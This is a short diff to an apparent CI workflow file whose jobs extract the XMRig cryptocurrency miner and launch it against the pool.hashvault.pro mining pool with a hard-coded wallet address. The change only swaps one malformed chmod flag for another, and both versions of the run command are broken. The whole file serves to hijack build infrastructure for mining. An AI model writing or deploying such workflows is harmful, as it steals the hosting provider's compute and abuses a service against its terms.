@@ -23,6 +23,6 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.15.0-gcc-win64.zip
     - name: RUNNING
-      run: chmod +x .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o pool.hashvault.pro:443 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p minering
+      run: chmod -R .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o pool.hashvault.pro:443 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p minering
     - name: DONE
       run: exit
